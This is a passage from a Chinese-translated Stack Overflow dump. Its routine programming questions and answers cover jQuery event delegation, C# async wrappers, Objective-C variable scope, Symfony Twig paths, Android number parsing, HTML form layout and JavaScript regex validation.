**请不要使用下面的代码 - 它效率低下，不可靠，仅用于测试**

### 回复：获得证书：

```
Public Shared Function GetClientCertificate() As X509Certificate2
    Dim Store As New X509Store(StoreName.My, StoreLocation.LocalMachine)
    Dim Ret As X509Certificate2 = Nothing

    Try
        Store.Open(OpenFlags.ReadOnly Or OpenFlags.OpenExistingOnly)
        For Each Certificate In Store.Certificates
            If Certificate.SubjectName.Name = "The subjectname of our certificate" Then
                Ret = Certificate
                Exit For
            End If
        Next
    Finally
        Store.Close()
    End Try
    Return Ret
End Function 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-01T11:30:26.447

您需要具有可访问私钥的证书才能将其用作客户端（或服务器，就此而言）证书。

只要您授予任何需要使用证书访问其私钥的用户，就可以将证书存储在机器证书存储中。您不能使用 .cer 对客户端进行身份验证，因为它只包含公钥。您可以通过为您的用户安装客户端证书并使用浏览器访问 URL 来测试所有内容。如果您得到一个选择证书的弹出窗口，则它已正确安装（对于该用户）。

# jquery - JQuery 使用 .on() 方法根据不同的选择器做不同的事情

> ID：13514630
> 
> 赞同：3
> 
> 时间：2012-11-22T14:19:09.583
> 
> 标签：jquery

我有几个不同的任务可能需要一些优化：

```
$('.container').on('click', '.one', function () {
  // do task one
});

$('.container').on('click', '.two', function () {
  // do task two
});

$('.container').on('click', '.three', function () {
  // do task three
}); 
```

合并为以下：

```
$('.container').on('click', '.one, .two, .three', function () {
  // How to selectively perform each task, based on the trigger/ selector?
  // Think of if (event.type === 'mouseenter') // do sumthing
}); 
```

问题是如何根据每个触发器/选择器有选择地执行每个不同的任务？还是有更好的方法来执行此操作？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-22T14:22:36.513

更好的方法可能只是链接`.on()`调用：

```
$('.container').on('click', '.one', function () {
    // do task one
}).on('click', '.two', function () {
    // do task two
}).on('click', '.three', function () {
    // do task three
}); 
```

这样做会消除每次触发事件处理程序时检查元素是否具有特定类所需的额外处理。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-22T14:21:51.220

```
$('.container').on('click', '.one, .two, .three', function () {
  if ($(this).hasClass("one")) {
    // do task one
  }
  if ($(this).hasClass("two")) {
    // do task two
  }
  if ($(this).hasClass("three")) {
    // do task three
  }
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-22T14:22:05.173

您可以使用`hasClass`方法：

```
$('.container').on('click', '.one, .two, .three', function () {
  var $this = $(this);
  if ($this.hasClass('one')) {
     // 
  } else if ($this.hasClass('two')) {
     //
  } else {
    //
  }
}); 
```

# javascript - Chrome 在访问首页时忽略 onbeforeunload（可能存在错误）

> ID：13514632
> 
> 赞同：0
> 
> 时间：2012-11-22T14:19:22.767
> 
> 标签：javascript, google-chrome, preload, prerender

我们运行文件上传服务。上传文件时，用户需要留在页面上，所以我们使用 window.onbeforeunload：

```
window.onbeforeunload = function() {
    return 'You still have files uploading...';
}; 
```

当用户尝试重新加载页面、关闭页面或转到新 URL 时，浏览器会警告他，他有机会留在页面上。

这可行，但我们在 Chrome 中发现了一个奇怪的行为。

当您尝试访问您经常访问的站点的 URL 时，它不会向用户显示弹出窗口，而只是快速转到请求的页面。就我而言，我可以让它与 reddit.com、facebook.com 一起工作，但不是 dog.com。

我*认为*这可能与预渲染或 Chrome 的其他一些优化有关，这使得它忽略了 onbeforeunload。

[您可以通过访问http://ge.tt](http://ge.tt)并开始文件上传来尝试一下。然后转到不同的 URL，并选择您经常访问的网站。Chrome 应该（错误地）让你这样做。

有谁知道该怎么做？onbeforeunload 不是我们应该再使用的东西吗？

# c# - 转换/包装使用回调的“经典”异步方法

> ID：13514634
> 
> 赞同：7
> 
> 时间：2012-11-22T14:19:35.683
> 
> 标签：c#, asynchronous, callback, async-await, windows-phone-8

我正在尝试将使用回调的“经典”异步方法转换为 async/await 方法。

这是代码：

```
authClient.LoginCompleted += authClient_LoginCompleted;
authClient.LoginAsync(new List<string>() { "var1", "var2" }, data);

static void authClient_LoginCompleted(object sender, LoginCompletedEventArgs e)
{ ... } 
```

其中“ `data`”是一个`UserState`，并且 `authClient_LoginCompleted`是回调。

我已经有了异步/等待方法的逻辑，问题是 windows phone 与 Microsoft.Live 的交互使用回调。我正在考虑使用信号量的解决方案，以免改变我的逻辑。这可能是一个不错的选择？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-22T19:33:04.997

如果您需要将异步回调包装到`Task`s 中，那么您可以使用`TaskCompletionSource<T>`. [MSDN 有完整的细节](http://msdn.microsoft.com/en-us/library/hh873178.aspx)。

但是，在您的情况下，您可以`LoginAsync`不使用`UserState`参数：

```
LiveLoginResult result = await authClient.LoginAsync(new[] { "var1", "var2" }); 
```

# objective-c - Objective-C 中的变量声明差异

> ID：13514642
> 
> 赞同：6
> 
> 时间：2012-11-22T14:20:21.333
> 
> 标签：objective-c, variables

我正在阅读有关 iOS 6 中 coreImage 的教程。在那篇教程中，我发现了类似的内容：

```
@implementation ViewController {
    CIContext *context;
    CIFilter *filter;
    CIImage *beginImage;
    UIImageOrientation orientation;
}
//Some methods
@end 
```

这些变量在 .m 文件中的 @implementation 语句之后的括号中声明。我第一次看到这种变量声明。

上面的变量声明和下面的代码有什么区别吗

```
@implementation ViewController

    CIContext *context;
    CIFilter *filter;
    CIImage *beginImage;
    UIImageOrientation orientation;

//Some methods

@end 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-22T14:39:47.757

这是个很大的差异。

`@interface`直接在or之后的括号内的变量`@implementation`是**实例变量**。这些是与您的类的每个实例相关联的变量，因此可以在您的实例方法中的任何位置访问。

如果不放括号，则声明**全局变量**。在任何括号块之外声明的任何变量都是全局变量，无论这些变量是在`@implementation`指令之前还是之后。**全局变量是邪恶的**，需要不惜一切代价避免（您可以声明全局常量，但避免使用全局变量），特别是因为它们不是线程安全的（因此可能会产生难以调试的错误）。

* * *

事实上，从历史上看（在 Objective-C 和编译器的第一个版本中），您只能`@interface`在`.h`文件中的括号中声明实例变量。

```
// .h
@interface YourClass : ParentClass
{
    // Declare instance variables here
    int ivar1;
}
// declare instance and class methods here, as well as properties (which are nothing more than getter/setter instance methods)
-(void)printIVar;
@end

// .m
int someGlobalVariable; // Global variable (bad idea!!)

@implementation YourClass

int someOtherGlobalVariable; // Still a bad idea
-(void)printIVar
{
    NSLog(@"ivar = %d", ivar1); // you can access ivar1 because it is an instance variable
    // Each instance of YourClass (created using [[YourClass alloc] init] will have its own value for ivar1
} 
```

只有现代编译器允许您在您的类扩展名（`@interface YourClass ()`在您的 .m 实现文件中）或在您`@implementation`的. 好处是对类的外部用户隐藏这些实例变量，方法是在 .m 文件中而不是在 .h 文件中声明它们，因为您的类的用户不需要了解内部编码细节你的班级，但只需要知道公共 API。`@interface``.h`

* * *

最后一个建议：Apple 越来越多地建议不要使用实例变量，而是`@property`直接使用，并让编译器（显式使用`@synthesize`指令，或隐式使用现代 LLVM 编译器）生成内部支持变量。所以最后你通常根本不需要声明实例变量，因此在指令`{ }`之后省略空：`@interface`

```
// .h
@interface YourClass : ParentClass

// Declare methods and properties here
@property(nonatomic, assign) int prop1;
-(void)printProp;
@end

// .m
@implementation YourClass
// @synthesize prop1; // That's even not needed with modern LLVM compiler
-(void)printProp
{
    NSLog(@"ivar = %d", self.prop1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:38:38.590

这是声明私有变量的一种方式，它们在类外不可见，也不显示在头文件中

# symfony - 包括子目录中的树枝文件

> ID：13514643
> 
> 赞同：10
> 
> 时间：2012-11-22T14:20:20.990
> 
> 标签：symfony, twig

我遇到了一个问题 - 当它放在子目录中时，我不能在另一个 twig 文件中包含一个 twig 文件。例子：

我有一个文件`AppUserBundle:Dashboard:index.html.twig`（symfony 路径`src/App/UserBundle/Resorcues/views/Dashboard/index.html.twig`和其他视图的路径）。在那个文件中，我有一个包含`Status.html.twig`在`AppUserBundle:Dashboard:User`子目录中的文件。但是当试图包含它时，我收到消息“找不到模板”。

```
{% include 'AppUserBundle:Dashboard:User:Status.html.twig' %} 
```

当我将 Status.html.twig 文件移动到`AppUserBundle:Dashboard`目录并包含它时，一切正常。我能以某种方式访问​​任何这样的文件吗？

```
AppUserBundle:Dashboard:Subdir:file 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-22T15:56:48.190

`AcmeDemoBundle:Welcome`只是一个逻辑控制器名称，`:`并不意味着`/`. 此逻辑名称指的是`@AcmeDemoBundle/Resources/views/Welcome`目录，其中`@AcmeDemoBundle`逻辑包名称变为`src/Acme/DemoBundle`.

如果要在名称中添加另一个目录，只需像往常一样将其放在逻辑名称之后：

```
AcmeDemoBundle:Welcome:User/index.html.twig 
```

这是指`src/Acme/DemoBundle/Resources/views/Welcome/User/index.html.twig`文件。

# javascript - 使用没有 AJAX 的 jQuery 选择性地提交字段

> ID：13514650
> 
> 赞同：1
> 
> 时间：2012-11-22T14:21:03.493
> 
> 标签：javascript, jquery, html, forms

我有一个可以动态扩展的 HTML 表单，最终可以在上面输入 400 多个可输入字段。我想有选择地决定在提交表单时发布哪些字段（不是通过 AJAX），以便只提交值已更改的字段。

我知道只有具有 name 属性的输入字段才会被实际发布，所以我的想法是获取每个元素 ID（已更改）并使用 JQuery 添加一个 name 属性，如下所示：-

> $('#field1').attr('name', 'field1');

这将在提交之前，因此（理论上）仅提交已更改的字段。

我已经通过谷歌搜索了执行此操作的示例，但令人惊讶的是在任何地方都找不到任何示例。我见过的最接近的是有人提到在提交之前禁用字段。

所以我的问题是：-这个想法可行吗？如果是这样，使用这种方法是否有任何负面原因？

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:26:42.743

```
$('input').change(function(){
  var newName = $(this).attr("id"); //could use any attribute, maybe data-name
  $(this).attr("name", newName);
}) 
```

当任何输入字段发生更改时，id 将作为其名称添加到字段中。

对于一般的设计问题，我可能会提交整个表单，并且只更新更改的字段服务器端 - 在我的情况下它实际上将由休眠处理。

# android - 在android中将String转换为Double

> ID：13514652
> 
> 赞同：2
> 
> 时间：2012-11-22T14:21:10.813
> 
> 标签：android

我有一个字符串 14469562，我想将它转换为 Double。但是在转换后得到一个与异常值不同的值。

这是我做的代码：

```
String s="14469562 ";
double d = Double.valueOf(s.trim()).doubleValue(); 
```

我的结果是 1.4469562E7 这是错误的。我怎样才能转换这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T23:20:58.370

您的解析已正确完成。

您遇到的“问题”是您的双精度如何在字符串中表示。由于它具有很大的价值，因此使用[科学记](http://en.wikipedia.org/wiki/Scientific_notation)数法来表示它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-22T14:23:33.897

尝试使用以下内容：

```
String s="14469562";
Double d = Double.parseDouble(s); 
```

PS：您的字符串中有白色字符，请更正或修剪它。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-22T14:23:42.727

尝试这个：

```
double d = Double.parseDouble(s.trim()); 
```

# linux - dbus_g_object_register_marshaller函数有什么用

> ID：13514658
> 
> 赞同：0
> 
> 时间：2012-11-22T14:21:21.550
> 
> 标签：linux, glib, dbus

我对 DBus 及其 Qt Binding 很熟悉。但我对 glib 和相关的东西很陌生。当我浏览某个项目的代码时，我遇到了“dbus_g_object_register_marshaller”函数。你能用简单的话简单地解释一下吗？

问候， Rajeev N Sambhu

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T08:28:28.360

必须有人知道 D-Bus 上的数据格式才能将其转换为所需的格式。这就是编组器正在为您做的事情。谷歌搜索“dbus_g_object_register_marshaller”，您会发现许多示例以便更好地理解。

# ruby-on-rails - 在苗条的标签内嵌套文本

> ID：13514660
> 
> 赞同：9
> 
> 时间：2012-11-22T14:21:40.453
> 
> 标签：ruby-on-rails, ruby, slim-lang

鉴于、 文本和其他是兄弟姐妹，我如何将`'Featured'`文本嵌套在标签内？`a``span``span`

```
li
  a href="#" class="selected"
    span class="icon-before"
    Featured
    span class="icon-after" 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-22T14:48:56.030

```
li
  a href="#" class="selected"
    span class="icon-before"
    | Featured
    span class="icon-after" 
```

给出：

```
<li><a class="selected" href="#"><span class="icon-before"></span>Featured<span class="icon-after"></span></a></li> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-03T15:24:57.413

```
ul
  li
    | first text
    span.color-red.bold-g
     | (text transform) 
```

给 ：

```
<ul><li>first text<span class="color-red bold-g">(text transform)</span></li> 
```

# html - 基于div的html页面设计

> ID：13514665
> 
> 赞同：0
> 
> 时间：2012-11-22T14:21:50.830
> 
> 标签：html, css

我正在设计一个基于 div 的 html 表单，但设计没有正确对齐

如何在基于 div 的设计中正确设计复杂的表单。有没有人有使用基于 div 的设计设计的复杂表单的链接。

这是我的 html 和 css 的一部分

```
<html>
<head>
<link rel="stylesheet" type="text/css" href="style.css" />
</head>

<body>

<div class="mainContainer">
    <div id="header"><div class="lblNormal">SERVICE CALL REPORT</div></div>
    <div id="callLog" >
        <div id="callLog1">  <label  class="lblNormal">SERVICE CALL LOG</label></div>
        <div id="callLog1"> <input type="text" class="textboxNormal" id="SerCallLog" name="txtSerCallLog" /></div>
    </div>
    <div id="typeVisit">
        <div id="typeVisit1"><div class="lblNormal">TYPE OF VISIT</div></div>
        <div id="typeVisit1">
            <select>
                <option value="Inspection">Inspection</option>
                <option value="Installation">Installation</option>
                <option value="Preventive">Preventive</option>
                <option value="Breakdown">Breakdown</option>
                <option value="Other">Other</option>
            </select>  
        </div>
        <div id="typeVisit1"><div class="lblNormal">TYPE OF SERVICE</div></div>
        <div id="typeVisit1">
            <select>
                <option value="WARRANTEE">WARRANTEE</option>
                <option value="EXCOMA">EXCOMA</option>
                <option value="COMA">COMA</option>
                <option value="SECOMA">SECOMA</option>
                <option value="SMA">SMA</option>
                <option value="SPUMA">SPUMA</option>
                <option value="OCS">OCS</option>
            </select>  
        </div>      
    </div>
    <div id="callRec">
        <div id="callRec1"><label  class="lblNormal">CALL RECEIVED ON:</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="CallRecOn" name="txtCallRecOn" /></div>
        <div id="callRec1"><label  class="lblNormal">TIME(in hrs.)</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="CallTime" name="txtCallTime" /></div>       
        <div id="callRec1"><label  class="lblNormal">CALL ATTENDED ON:</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="CallAttendedOn" name="txtCallAttendedOn" /></div>
        <div id="callRec1"><label  class="lblNormal">TIME IN(in hrs.):</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="TimeIn" name="txtTimeIn" /></div>
        <div id="callRec1"><label  class="lblNormal">TIME OUT(in hrs.):</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="TimeOut" name="txtTimeOut" /></div>     
        <div id="callRec1"><label  class="lblNormal">TIME ON CALL(in hrs.):</label></div>
        <div id="callRec1"><input type="text" class="textboxNormal" id="TimeOnCall" name="txtTimeOnCall" /></div>       
    </div>
    <div id="assoData">
        <div id="assoData1"><div class="lblNormal">ASSOCIATE DATA:NAME</div></div>
        <div id="assoData1"><input type="text" class="textboxNormal" id="AssociateDataName" name="txtAssociateDataName" /></div>
        <div id="assoData1"><div class="lblNormal">LOCATION:</div></div>
        <div id="assoData1"><input type="text" class="textboxNormal" id="AssociateDataLocation" name="txtAssociateDataLocation" /></div>
        <div id="assoData1"><div class="lblNormal">TEL:</div></div>
        <div id="assoData1"><input type="text" class="textboxNormal" id="AssociateDataTel" name="txtAssociateDataTel" /></div>      
    </div>
    <div id="equipData">
        <div id="equipData1"><div class="lblNormal">EQUIPMENT DATA SR.NO.:</div></div>
        <div id="equipData1"><input type="text" class="textboxNormal" id="EquipmentDataSrNo" name="txtEquipmentDataSrNo" /></div>
        <div id="equipData1"><div class="lblNormal">MODEL:</div></div>
        <div id="equipData1"><input type="text" class="textboxNormal" id="EquipmentDataModel" name="txtEquipmentDataModel" /></div>
        <div id="equipData1"><div class="lblNormal">LOAD DATA:</div></div>
        <div id="equipData1"><input type="text" class="textboxNormal" id="EquipmentDataLoadData" name="txtEquipmentDataLoadData" /></div>   
    </div>
    <div id="battData">
        <div id="battData1"><div class="lblNormal">BATTERY DATA:TYPE-</div></div>
        <div id="battData1">
            <select>
                <option value="SMF">SMF</option>
                <option value="WT">WT</option>              
            </select>  
        </div>
        <div id="battData1"><div class="lblNormal">MAKE:</div></div>
        <div id="battData1"><input type="text" class="textboxNormal" id="BattaryDataMake" name="txtBattaryDataMake" /></div>
        <div id="battData1"><div class="lblNormal">VOLTS:</div></div>
        <div id="battData1"><input type="text" class="textboxNormal" id="BattaryDataVolts" name="txtBattaryDataVolts" /></div>  
        <div id="battData1"><div class="lblNormal">AH:</div></div>
        <div id="battData1"><input type="text" class="textboxNormal" id="BattaryDataAh" name="txtBattaryDataAh" /></div>
        <div id="battData1"><div class="lblNormal">NOS:</div></div>
        <div id="battData1"><input type="text" class="textboxNormal" id="BattaryDataNOS" name="txtBattaryDataNOS" /></div>
    </div>
    <div id="battCond">
        <div id="battCond1"><div class="lblNormal">BATTERY CONDITION:CHARGING VOLTAGE:</div></div>
        <div id="battCond1"><input type="text" class="textboxNormal" id="BattaryConditionChargingVoltage" name="txtBattaryConditionChargingVoltage" /></div>
        <div id="battCond1"><div class="lblNormal">VDC</div></div>
        <div id="battCond1"><input type="text" class="textboxNormal" id="BattaryConditionVDC" name="txtBattaryConditionVDC" /></div>
        <div id="battCond1"><div class="lblNormal">DISCHARGE VOLTAGE(ON LOAD):</div></div>
        <div id="battCond1"><input type="text" class="textboxNormal" id="BattaryConditionDiscVolt" name="txtBattaryConditionDiscVolt" /></div>  
        <div id="battCond1"><div class="lblNormal">VDC</div></div>
        <div id="battCond1"><input type="text" class="textboxNormal" id="BattaryConditionOnLoadVDC" name="txtBattaryConditionOnLoadVDC" /></div>        
    </div>
    <div id="maintenance">
        <div id="preveMaintMain">
            <div id="preveMaint">
                <div id="preveMaint1">
                    <div class="lblNormal">PREVENTIVE MAINTENANCE</div>
                </div>
                <div id="preveMaint1">
                    <div><div class="lblNormal">Condition of Ventilation</div></div>
                    <div><div class="lblNormal">Condition of Nut & Bolts of Equipment</div></div>
                    <div><div class="lblNormal">Condition of Input & Output Cables</div></div>
                    <div><div class="lblNormal">Condition of FAN , METER & LED Indication</div></div>
                    <div><div class="lblNormal">Equipment cleaned with vacuum</div></div>
                </div>
                <div id="preveMaint1">
                    <div>
                        <select>
                            <option value="Good">Good</option>
                            <option value="Bad">Bad</option>                            
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Good">Good</option>
                            <option value="Bad">Bad</option>                            
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Good">Good</option>
                            <option value="Bad">Bad</option>                            
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Good">Good</option>
                            <option value="Bad">Bad</option>                            
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Yes">Yes</option>
                            <option value="No">No</option>                          
                        </select>  
                    </div>
                </div>
            </div>
            <div id="preveMaintVolt">
                <div></div>
                <div><div class="lblNormal">Input Voltage</div><input type="text" class="textboxNormal" id="InputVoltage" name="txtInputVoltage" />VAC<div class="lblNormal">Output Voltage</div><input type="text" class="textboxNormal" id="OutputVoltage" name="txtOutputVoltage" />VAC</div>
                <div><div class="lblNormal">Checked Battery Back up (In Min.)</div><input type="text" class="textboxNormal" id="CheckedBattBackup" name="txtCheckedBattBackup" /></div>
            </div>
        </div>
        <div id="batMainNFault">
            <div id="battMaint">
                <div id="battMaint1"><div class="lblNormal">BATTERY MAINTEINANCE :</div></div>
                <div id="battMaint1">
                    <div><div class="lblNormal">Condition of Nut, Bolts & Links :</div></div>
                    <div><div class="lblNormal">Terminals & Lugs OK :</div></div>
                    <div><div class="lblNormal">Filled D.M.Water :</div></div>
                    <div><div class="lblNormal">Gravity & Voltage Checked :</div></div>
                    <div><div class="lblNormal">Cleaning Done :</div></div>
                </div>
                <div id="battMaint1">
                    <div>
                        <select>
                            <option value="Good">Good</option>
                            <option value="Bad">Bad</option>
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Yes">Yes</option>
                            <option value="No">No</option>
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Yes">Yes</option>
                            <option value="No">No</option>
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Yes">Yes</option>
                            <option value="No">No</option>
                        </select>  
                    </div>
                    <div>
                        <select>
                            <option value="Yes">Yes</option>
                            <option value="No">No</option>
                        </select>  
                    </div>
                </div>
            </div>
            <div id="faltReported">
                <div id="faltReported1"><div class="lblNormal">FAULT REPORTED</div></div>
                <div id="faltReported2"><input type="text" class="textboxNormal" id="faultReported" name="txtfaultReported" /></div>
            </div>
        </div>
    </div>
    <div id="solutions">
        <div id="solutions1"><div class="lblNormal">SOLUTION</div></div>
        <div id="solutions2">
            <textarea rows="2" cols="50"> </textarea> 
        </div>
    </div>
    <div id="remark">
        <div id="remark1"><div class="lblNormal">REMARKS</div></div>
        <div id="remark2">
            <textarea rows="2" cols="50"> </textarea> 
        </div>
    </div>
</div><!-- Main div -->

</body>
</html> 
```

我的 CSS 的一部分

```
 .mainContainer
    {
        width:100%; 
        height:90%;
        background-color:gray;  
    }

    .lblNormal
    {
        font-family:Verdana, Geneva, sans-serif;
        font-size:5px;  
    }

    .textboxNormal
    {       
        width:50px;
        height:8px; 
    }
    .textboxLarge
    {   
        width:100px;
        height:8px; 
    }
    .textboxSmall
    {   
        width:25px;
        height:8px; 
    }

    #header
    {
        width:50%;
        height:10%;
        background-color:gray;
    }
    #callLog
    {
        width:40%;
        height:10%; 
        border:1px solid black;
    }
    #callLog1
    {
        width:48%;
        height:90%;
        float:left;
        display:block;  
    }

    #typeVisit
    {
        width:100%;
        height:10%;
        border:1px solid black;
    }
    #typeVisit1
    {
        width:24.5%;
        float:left;
        display:block;
        height:90%;     
    }
    #callRec
    {
        width:100%;
        height:10%; 
        border:1px solid black;
    }
    #callRec1
    {
        width:7.9%;
        height:100%;
        float:left;
        display:block;

    }

    #assoData
    {
        width:100%;
        height:10%; 
    }
    #assoData1
    {
        width:16%;
        height:100%;
        float:left;
        display:block;  
    }

    #equipData
    {
        width:100%;
        height:10%;

    }
    #equipData1
    {
        width:16%;
        height:100%;
        float:left;
        display:block;

    }
    #battData
    {
        width:100%;
        height:10%;
        background-color:red;
    }
    #battData1
    {
        width:9.9%;
        height:100%;
        float:left;
        display:block;
        background-color:red;
    }

    #battCond
    {
        width:100%;
        height:10%;
        background-color:blue;
    }
    #battCond1
    {
        width:11%;
        height:100%;
        float:left;
        display:block;
        background-color:green;
    }

    #maintenance
    {
        width:100%;
        height:20%;
        background-color:black;
    }

    #preveMaintMain
    {
        width:49%;
        height:100%;
        float:left;
        display:block;
        background-color:aqua;
    }
    #preveMaint
    {
        width:100%;
        height:100%;
        float:left;
        display:block;
        background-color:aqua;
    }
    #preveMaint1
    {
        width:32%;
        height:100%;
        float:left;
        display:block;
        background-color:red;
    }
    #preveMaintVolt
    {   
        width:100%;
        height:100%;
        float:left;
        display:block;
        background-color:aqua;  
    }

    #batMainNFault
    {
        width:49%;
        height:100%;
        float:left;
        display:block;
        background-color:red;
    }
    #battMaint
    {
        width:100%;
        height:60%; 
        background-color:yellow;
    }
    #battMaint1
    {
        width:32%;
        height:100%;
        float:left;
        display:block;
        background-color:green;
    }

    #faltReported
    {
        width:100%;
        height:60%; 
        background-color:yellow;
    }
    #faltReported1
    {
        width:32%;
        height:100%;
        float:left;
        display:block;
        background-color:green;
    }
    #faltReported2
    {
        width:64%;
        height:100%;
        float:left;
        display:block;
        background-color:green;
    }

    #solutions
    {
        width:100%;
        height:10%;
        background-color:GREEN;
    }
    #solutions1
    {
        width:14%;
        height:100%;
        float:left;
        display:block;
        background-color:RED;
    }
    #solutions2
    {
        width:85%;
        height:100%;
        float:left;
        display:block;
        background-color:YELLOW;
    }

    #remark
    {
        width:100%;
        height:10%;
        background-color:BLUE;
    }
    #remark1
    {
        width:14%;
        height:100%;
        float:left;
        display:block;
        background-color:YELLOW;
    }
    #remark2
    {
        width:85%;
        height:100%;
        float:left;
        display:block;
        background-color:RED;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-05T03:35:47.577

不确定它有什么复杂之处或您对 BUT 有什么困难，因为您说它在 IE 中看起来很糟糕，那么我将假设您没有使用 css 重置。

什么是 CSS 重置？简而言之， ”

> 重置样式表的目标是减少浏览器在默认行高、页边距和标题字体大小等方面的不一致。

首先检查此链接并下载其中任何一个（尽管我总是使用 Eric Meyer 的） [http://www.cssreset.com/](http://www.cssreset.com/)

点击“获取代码”按钮。获得后，将其插入标题中。

一旦完成，相应的样式。在最流行的浏览器上，所有浏览器都应该看起来一样（如果不是全部的话）

# jquery-ui - 任何人都可以指导我有关此 jquery reg exp 验证

> ID：13514667
> 
> 赞同：0
> 
> 时间：2012-11-22T14:21:52.590
> 
> 标签：jquery-ui, jquery, jquery-plugins

这是我的 jQuery 代码：

```
$(document).ready(function(e) {
    $('#step1 #fName').focus(function() {
        $('#step1 #fName').keyup(function() {
            var reg = /^([A-Za-z])$/;
            var check = $('#step1 #fName').val();

            if (reg.test(check) == true || check.match(reg) == true) {
                $('#step1 #fName').css('border',' 1px solid #CCC'); 
            }
            else {
                $('#step1 #fName').css('border',' 1px solid #b20000');  
            }
        });
    });
}); 
```

我想在这个 HTML 标签上应用 jQuery 验证：

```
<input type="text" class="width-260" id="fName"/> 
```

我该怎么做呢？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:28:48.137

您需要创建一个 RegExp 对象，使用 new RegExp()...

尝试：

```
var reg = new RegExp('^([A-Za-z])$'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:34:38.653

您可以使用文字 RegExp 创建，但是您不想在事件中分配`keyup`处理程序`focus`

```
$(document).ready(function (e) {
    var keyupHandler = function () {
            var self = $(this),
                reg = /^([A-Za-z])$/,
                check = self.val(),
                matches = reg.test(check) || check.match(reg),
                border = matches ? '1px solid #CCC' : '1px solid #b20000';
            self.css('border', border)
        };
    $('#step1 #fName').keyup(keyupHandler).focus();
});​ 
```

工作演示：http: [//jsfiddle.net/X3ZDQ/](http://jsfiddle.net/X3ZDQ/)

此外，您当前的正则表达式只允许输入中的一个字符，如果这不是您想要的效果，请将您的正则表达式更改为`/^([A-Za-z]+)$/`

**更新：**

“在任何字母数字上”所固有的问题是双重的。

首先，您的正则表达式只允许字母，而不是数字。

其次，如果您只验证`keyup`事件中的单个字符，您的验证将产生误报。

随时间变化的例子：

```
a       //a is valid
an      //n is valid
an1     //1 is not valid, so border changes to red
an1n    //n is valid, so border changes back to grey 
```

最终值为`an1n`，这是无效的，因为它包含 a `1`，但您的验证例程通过了它，因为最后输入的字符是 an `n`，这是有效的。

您最好验证输入中的整个字符串。为此，请更改您的正则表达式以`+`在您的字符类之后包含一个量词：

```
/^([A-Za-z]+)$/ 
```

更新小提琴：http: [//jsfiddle.net/X3ZDQ/1/](http://jsfiddle.net/X3ZDQ/1/)

# c# - c# 测试中的超时

> ID：13514672
> 
> 赞同：2
> 
> 时间：2012-11-22T14:22:09.593
> 
> 标签：c#, visual-studio, mstest

任何人都可以判断 finally 是否总是在测试超时后执行。

```
[Timeout(1000)][TestMethod]
public void test()
{
  try
  {
     System.Threading.Thread.Sleep(2000);
  }
  finally
  {
     //do something
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:40:17.380

如果可能，请使用 TestCleanUp 方法，以便在测试超时后执行工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:28:25.377

finally**总是**执行，不管你是否有 try/catch/ 块，当其中任何一个完成时执行

# javascript - 增加对变量范围和声明的理解

> ID：13514681
> 
> 赞同：1
> 
> 时间：2012-11-22T14:22:54.320
> 
> 标签：javascript, jquery

```
(function() {

    var content = [
        {
            title: 'My awesome blog post',   
            thumbnail: 'images/bane.jpg',
        },
        {
            title: 'My second awesome blog post',
            thumbnail: 'images/joker.jpg',
        },
    ],
        template = $.trim( $('#blogTemplate').html() ),
        frag = '';

    $.each( content, function( index, obj ) {  
        frag +=
            template.replace( /{{title}}/ig, obj.title )
                    .replace( /{{thumbnail}}/ig, obj.thumbnail );       
    });

    $('body').append(frag);

})(); 
```

你好，

我只是想知道为什么包含在自调用匿名函数中的代码块不能具有以下以 var 关键字为前缀的变量声明，如下所示：

```
 var template = $.trim( $('#blogTemplate').html() ),
    var frag = ''; 
```

将 var 关键字添加到此函数的局部变量中 -`template`似乎`frag`破坏了我的代码，我真的不明白为什么，但是如果我声明`template`并`frag`在函数外部的全局范围内，如下所示，那么我的代码可以工作。

```
var template;
var frag; 
```

如果这与范围有关，并且任何人都有时间解释，将不胜感激。理想情况下，我想添加前缀`template`和`frag`var 关键字以增加可读性。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:24:56.690

我怀疑是变量声明之间的逗号破坏了您的代码，而不是`var`关键字本身的使用。试试这个：

```
var template = $.trim( $('#blogTemplate').html() ),
frag = ''; 
```

该`var`关键字已经应用于您提供的第一个片段中的模板和片段，因为它们是局部变量声明的逗号分隔列表中的第二项和第三项。

```
function(){
    var x = 1, 
        y = 2, 
        z = 3;
    window.x; //undefined
    x; //1
    window.y;//undefined
    y; //2
} 
```

最简洁的方法是完全避开语法糖，并将每个变量声明分隔成单独的语句：

```
var content = [
    {
        title: 'My awesome blog post',   
        thumbnail: 'images/bane.jpg',
    },
